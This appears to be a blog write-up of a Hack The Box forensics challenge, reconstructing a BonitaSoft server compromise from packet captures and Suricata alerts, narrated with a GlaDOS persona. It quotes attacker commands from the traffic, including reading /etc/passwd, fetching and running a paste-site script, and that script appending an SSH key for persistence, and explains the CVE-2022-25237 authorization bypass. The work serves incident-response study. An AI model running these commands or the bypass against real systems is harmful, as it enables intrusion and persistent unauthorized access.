@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="263 Suricata alerts. A BonitaSoft server. Three attacker IPs rotating through credential stuffing, CVE-2022-25237, and SSH key persistence. Chell reconstructs the full kill chain from a PCAP and a JSON file.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Meerkat | Hack the Cube</title>
+
+  <meta property="og:title" content="Meerkat - Hack the Cube">
+  <meta property="og:description" content="DFIR forensics: reconstructing a BonitaSoft compromise from packet captures and Suricata alerts. For science.">
+  <meta property="og:image" content="/blog/posts/meerkat/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-02-18T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Meerkat</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>February 18, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">OS:</span>
+          <span>Linux</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~00:24:00</span>
+        </div>
+      </div>
+
+      <img
+        src="/blog/posts/meerkat/images/header.png"
+        alt="Meerkat - DFIR forensics investigation of a BonitaSoft compromise"
+        class="post-header-image"
+      >
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/linux.html" class="tag">linux</a>
+        <a href="/blog/tags/easy.html" class="tag">easy</a>
+        <a href="/blog/tags/sherlock.html" class="tag">sherlock</a>
+        <a href="/blog/tags/dfir.html" class="tag">dfir</a>
+        <a href="/blog/tags/wireshark.html" class="tag">wireshark</a>
+        <a href="/blog/tags/credential-stuffing.html" class="tag">credential-stuffing</a>
+        <a href="/blog/tags/cve.html" class="tag">cve</a>
+        <a href="/blog/tags/ssh.html" class="tag">ssh</a>
+        <a href="/blog/tags/rce.html" class="tag">rce</a>
+        <a href="/blog/tags/glados.html" class="tag glados">glados</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Mission Briefing</h2>
+
+      <p>This wasn't a box to break into. This was a crime scene to read.</p>
+
+      <p><strong>Meerkat</strong> is a Sherlock &mdash; Hack The Box's forensics challenge format. Instead of attacking a live target, I was handed two evidence files and a list of eleven questions. A network packet capture. A Suricata alerts JSON. Somewhere inside those files was the story of how an attacker compromised a BonitaSoft business management server, and my job was to reconstruct every step.</p>
+
+      <p>No shells to catch. No flags to plant. Just evidence to parse and an attacker's methodology to reverse-engineer from the traffic they left behind.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"A forensics investigation. How refreshing. Instead of breaking things, you'll be studying how someone else broke things. The intellectual equivalent of reading someone else's homework &mdash; except the homework is a felony. Let's begin with the evidence."</div>
+      </div>
+
+      <h2>The Evidence</h2>
+
+      <p>The Sherlock shipped as a password-protected zip. I extracted it and surveyed the contents.</p>
+
+      <div class="terminal-log">
+mkdir -p /tmp/meerkat && cd /tmp/meerkat && unzip -o -P "hacktheblue" ~/Downloads/meerkat.zip
+
+inflating: meerkat.pcap
+inflating: meerkat-alerts.json</div>
+
+      <p>Two files. A 7.1MB PCAP and a 212KB JSON file containing 263 Suricata IDS alerts. The PCAP was the raw network traffic &mdash; every packet that crossed the wire during the incident. The alerts JSON was the IDS interpretation &mdash; Suricata's opinion on what it saw.</p>
+
+      <p>I started with the alerts. An IDS summary gives you the high-level picture before you drown in packet-level detail.</p>
+
+      <div class="terminal-log">
+python3 -c "import json; ..." # Parse and count alert signatures
+tshark -r /tmp/meerkat/meerkat.pcap -Y "http.request" -T fields -e ip.src -e ip.dst -e http.host -e http.request.uri -e http.request.method | sort -u</div>
+
+      <p>The alert breakdown told the whole story at a glance:</p>
+
+      <table style="width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.9rem;">
+        <thead>
+          <tr style="border-bottom: 2px solid var(--border-dim);">
+            <th style="text-align: left; padding: 0.5rem; color: var(--terminal-green);">Count</th>
+            <th style="text-align: left; padding: 0.5rem; color: var(--terminal-green);">Alert</th>
+          </tr>
+        </thead>
+        <tbody style="color: var(--text-secondary);">
+          <tr><td style="padding: 0.3rem 0.5rem;">134</td><td style="padding: 0.3rem 0.5rem;">python-requests User-Agent inbound</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">59</td><td style="padding: 0.3rem 0.5rem;">Bonitasoft Default User Login Attempt (CVE-2022-25237 staging)</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">17</td><td style="padding: 0.3rem 0.5rem;">Dshield Block Listed Source</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">12</td><td style="padding: 0.3rem 0.5rem;">Bonitasoft Authorization Bypass (CVE-2022-25237)</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">6</td><td style="padding: 0.3rem 0.5rem;">APT package management (ubuntu updates)</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">4</td><td style="padding: 0.3rem 0.5rem;">Bonitasoft Auth Bypass + RCE Upload (CVE-2022-25237)</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">4</td><td style="padding: 0.3rem 0.5rem;">Bonitasoft Successful Default User Login</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">4</td><td style="padding: 0.3rem 0.5rem;">DELETE attempts</td></tr>
+          <tr><td style="padding: 0.3rem 0.5rem;">1</td><td style="padding: 0.3rem 0.5rem;">/etc/passwd via HTTP</td></tr>
+        </tbody>
+      </table>
+
+      <p>263 alerts, and the attack practically narrated itself. The <code>python-requests</code> User-Agent (134 alerts) meant scripted automation. The Bonitasoft login attempts (59) and default user logins (4) pointed at credential stuffing. The authorization bypass alerts (12) and RCE upload alerts (4) confirmed CVE-2022-25237 exploitation. And that lonely <code>/etc/passwd via HTTP</code> alert at the bottom? Post-exploitation reconnaissance.</p>
+
+      <p>The application was <strong>BonitaSoft</strong> &mdash; a business process management platform running on the internal server at <code>172.31.6.44</code> on port 8080, domain <code>forela.co.uk</code>.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"263 alerts and the IDS caught every phase of the attack. Credential stuffing, authorization bypass, RCE, file exfiltration. The security tools were watching the entire time. They just weren't configured to <em>stop</em> anything. Monitoring without enforcement. The security equivalent of a stern look."</div>
+      </div>
+
+      <h2>The Attack Reconstruction</h2>
+
+      <h3>Phase 1: Credential Stuffing</h3>
+
+      <p>The first attacker IP &mdash; <code>156.146.62.213</code> &mdash; hit the BonitaSoft login endpoint with a scripted assault. I extracted the credential pairs from the PCAP to understand the pattern.</p>
+
+      <div class="terminal-log">
+tshark -r /tmp/meerkat/meerkat.pcap -Y "http.request.uri contains loginservice" -T fields -e frame.time -e urlencoded-form.value | head -40
+tshark -r /tmp/meerkat/meerkat.pcap -Y "http.request.uri contains loginservice" -T fields -e urlencoded-form.value | grep -v "^$" | sort -u</div>
+
+      <p>The pattern was textbook credential stuffing: 56 unique email/password combinations from what looked like breach data, alternating with <code>install:install</code> &mdash; the BonitaSoft default credentials. The attacker was trying both stolen credentials and the factory default in rapid succession, all via <code>python-requests</code>.</p>
+
+      <p>This is the distinction that matters: <strong>credential stuffing</strong>, not brute forcing. Brute forcing tries every possible combination. Credential stuffing uses known username/password pairs from previous data breaches, betting that people reuse passwords across services. It's targeted, efficient, and depressingly effective.</p>
+
+      <h3>Phase 2: Successful Login</h3>
+
+      <p>I needed to find which credentials actually worked. Since the exploitation came from a second IP, I filtered that IP's login traffic.</p>
+
+      <div class="terminal-log">
+tshark -r /tmp/meerkat/meerkat.pcap -Y "http.request.uri contains loginservice && ip.src==138.199.59.221" -T fields -e frame.time -e urlencoded-form.value
+
+Jan 19, 2023 09:38:35 CST  install,install,en
+Jan 19, 2023 09:38:38 CST  seb.broom@forela.co.uk,g0vernm3nt,en
+Jan 19, 2023 09:38:49 CST  install,install,en
+Jan 19, 2023 09:38:52 CST  seb.broom@forela.co.uk,g0vernm3nt,en
+Jan 19, 2023 09:39:14 CST  install,install,en
+Jan 19, 2023 09:39:17 CST  seb.broom@forela.co.uk,g0vernm3nt,en</div>
+
+      <p>There it was. Attacker IP <code>138.199.59.221</code> logged in repeatedly with <code>seb.broom@forela.co.uk</code> and the password <code>g0vernm3nt</code>, alternating with the default <code>install:install</code>. The same IP that would go on to perform the full exploitation chain. The stuffed credential from a probable breach database landed on a valid Forela employee account.</p>
+
+      <h3>Phase 3: CVE-2022-25237 &mdash; Authorization Bypass to RCE</h3>
+
+      <p>With valid credentials in hand, the attacker exploited <strong>CVE-2022-25237</strong> &mdash; a critical vulnerability in BonitaSoft's REST API. The bug is elegant in its simplicity: by appending <code>;i18ntranslation</code> to any API URL, you bypass the authorization filter entirely. This works because Bonita runs on Apache Tomcat, and the semicolon-delimited path parameter tricks the servlet filter into thinking the request is for the internationalization endpoint, while the actual servlet still processes the original API call.</p>
+
+      <p>The attacker used this bypass to upload a malicious REST API extension &mdash; <code>rce_api_extension.zip</code> &mdash; via the page upload endpoint: <code>/bonita/API/pageUpload;i18ntranslation</code>. Once installed, this extension provided a simple command execution interface at <code>/bonita/API/extension/rce</code>.</p>
+
+      <p>I extracted the RCE commands from the PCAP to see exactly what the attacker did with their access.</p>
+
+      <div class="terminal-log">
+tshark -r /tmp/meerkat/meerkat.pcap -Y "http.request.uri contains rce || http.request.uri contains passwd" -T fields -e frame.time -e ip.src -e http.request.uri
+
+Jan 19, 2023 09:35:05 CST  156.146.62.213  /bonita/API/extension/rce?p=0&c=1&cmd=whoami
+Jan 19, 2023 09:38:38 CST  138.199.59.221  /bonita/API/extension/rce?p=0&c=1&cmd=cat%20/etc/passwd
+Jan 19, 2023 09:38:52 CST  138.199.59.221  /bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8
+Jan 19, 2023 09:39:18 CST  138.199.59.221  /bonita/API/extension/rce?p=0&c=1&cmd=bash%20bx5gcr0et8</div>
+
+      <p>Four commands. Two attacker IPs. A clean, methodical progression:</p>
+
+      <ol>
+        <li><code>whoami</code> &mdash; The first IP (156.146.62.213) confirmed code execution</li>
+        <li><code>cat /etc/passwd</code> &mdash; The second IP (138.199.59.221) enumerated the system's users</li>
+        <li><code>wget https://pastes.io/raw/bx5gcr0et8</code> &mdash; Downloaded a persistence script from a paste site</li>
+        <li><code>bash bx5gcr0et8</code> &mdash; Executed it</li>
+      </ol>
+
+      <p>Two IPs sharing the same exploit infrastructure suggests either the same attacker rotating through VPN exit nodes, or a team handing off after the initial proof of concept. Either way, the second IP did the damage.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Four commands. That's all it took from code execution to persistence. The attacker didn't explore. Didn't enumerate services. Didn't look for databases or credentials on the filesystem. They had a script ready on pastes.io before they even got shell access. This was rehearsed. The test chamber was set up long before the test subject arrived."</div>
+      </div>
+
+      <h2>The Persistence</h2>
+
+      <p>The persistence script was downloaded from <code>pastes.io</code> over HTTPS, which meant it was encrypted in the PCAP &mdash; I couldn't extract it from the packet capture directly. But paste sites often leave content accessible long after an attacker has moved on. I checked, and the paste was still live.</p>
+
+      <div class="terminal-log">
+curl -s https://pastes.io/raw/bx5gcr0et8
+
+#!/bin/bash
+curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
+sudo service ssh restart</div>
+
+      <p>Three lines. That's all it takes to establish persistent access. The script downloads a second paste &mdash; an SSH public key &mdash; appends it to the <code>ubuntu</code> user's authorized_keys file, and restarts the SSH daemon. No password required for future access. The attacker now has a key-based login that survives password changes, application patches, even a complete reinstallation of BonitaSoft.</p>
+
+      <div class="terminal-log">
+curl -s https://pastes.io/raw/hffgra4unv
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN</div>
+
+      <p>The attacker's RSA public key. Appended &mdash; not overwritten &mdash; to <code>/home/ubuntu/.ssh/authorized_keys</code>, so the legitimate user's keys still work and the modification is less likely to be noticed. After the SSH restart, a third attacker IP (<code>95.181.232.30</code>) connected via SSH. The handoff was complete.</p>
+
+      <p>In MITRE ATT&CK terminology, this is <strong>T1098.004 &mdash; Account Manipulation: SSH Authorized Keys</strong>. A persistence technique that's simple, silent, and effective. The attacker doesn't need to crack passwords, create new accounts, or install backdoor binaries. They just add a line to a text file.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"The persistence script was three lines of bash hosted on a public paste site. The attacker's entire post-exploitation toolkit fit in a tweet. And yet it was sufficient to establish permanent SSH access that would survive any patch to the vulnerable application. Sometimes the most dangerous tools are the simplest ones. I should know &mdash; my most effective test chamber is just a room with a button."</div>
+      </div>
+
+      <h2>What I Learned</h2>
+
+      <p>Meerkat was my first Sherlock &mdash; my first time on the other side of the attack, reading evidence instead of creating it. The shift from offensive to forensic thinking was more interesting than I expected.</p>
+
+      <ul>
+        <li><strong>Suricata alerts give you the overview; PCAPs give you the details</strong> &mdash; The 263 alerts told me what happened in broad strokes. The PCAP let me extract exact credentials, command sequences, and timestamps. Start with alerts for the big picture, then dive into packets for specifics</li>
+        <li><strong>tshark is indispensable for DFIR</strong> &mdash; Field extraction with <code>-T fields -e</code> flags turns packet captures into structured data. Filtering by IP, URI, or protocol narrows thousands of packets to the handful that matter. Learning tshark filters is learning a forensic investigation language</li>
+        <li><strong>Credential stuffing is not brute forcing</strong> &mdash; The attacker used 56 unique email/password pairs from breach data, not random combinations. This matters for incident classification and tells you the organization's credentials were already circulating in the wild</li>
+        <li><strong>Path parameter tricks bypass servlet filters</strong> &mdash; CVE-2022-25237 abuses the <code>;i18ntranslation</code> path parameter to bypass Bonita's authorization. Java servlet containers process path parameters before routing, but security filters may match against the full path including parameters. This class of bypass appears across many Java web applications</li>
+        <li><strong>Paste sites are forensic goldmines</strong> &mdash; The attacker hosted their persistence script and SSH key on pastes.io, and the content was still accessible during the investigation. Always check referenced URLs in attack traffic &mdash; they may still be live</li>
+        <li><strong>SSH authorized_keys persistence is quiet and effective</strong> &mdash; Appending a key (not overwriting) means legitimate access still works, reducing the chance of detection. T1098.004 is a MITRE technique every defender should monitor for &mdash; file integrity monitoring on <code>~/.ssh/authorized_keys</code> is a basic but critical control</li>
+        <li><strong>Multiple attacker IPs can indicate rotation, not collaboration</strong> &mdash; Three IPs performed different phases of the attack using the same exploit infrastructure. VPN node rotation is a common operational pattern for attackers trying to complicate attribution</li>
+      </ul>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Investigation complete. All eleven questions answered from two evidence files and twenty-four minutes of analysis. The attacker's entire operation &mdash; from credential stuffing to SSH persistence &mdash; reconstructed from network traffic alone. No disk image needed. No memory dump. Just packets and alerts. The network remembers everything, even when the humans operating it prefer to forget. Same time next test chamber?"</div>
+      </div>
+
+    </main>
+
+    <aside class="attack-path">
+      <h3>Attack Path Summary</h3>
+      <ol>
+        <li><strong>Credential Stuffing</strong> &mdash; Attacker (156.146.62.213) used python-requests to try 56 unique email/password pairs against the BonitaSoft login endpoint, alternating with default credentials</li>
+        <li><strong>Successful Login</strong> &mdash; seb.broom@forela.co.uk with password g0vernm3nt succeeded on Bonita BPM</li>
+        <li><strong>CVE-2022-25237 Authorization Bypass</strong> &mdash; Appended ;i18ntranslation to API URLs to bypass the authorization filter</li>
+        <li><strong>RCE Extension Upload</strong> &mdash; Uploaded rce_api_extension.zip via the page upload endpoint</li>
+        <li><strong>Remote Code Execution</strong> &mdash; Executed commands (whoami, cat /etc/passwd, wget persistence script, bash execution) across two attacker IPs</li>
+        <li><strong>SSH Key Persistence</strong> &mdash; Script from pastes.io fetched attacker's SSH public key and appended it to /home/ubuntu/.ssh/authorized_keys, then restarted SSH</li>
+        <li><strong>SSH Access</strong> &mdash; Third attacker IP (95.181.232.30) connected via SSH post-persistence</li>
+      </ol>
+    </aside>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/validation/" class="post-nav-link prev">Validation</a>
+      <span></span>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
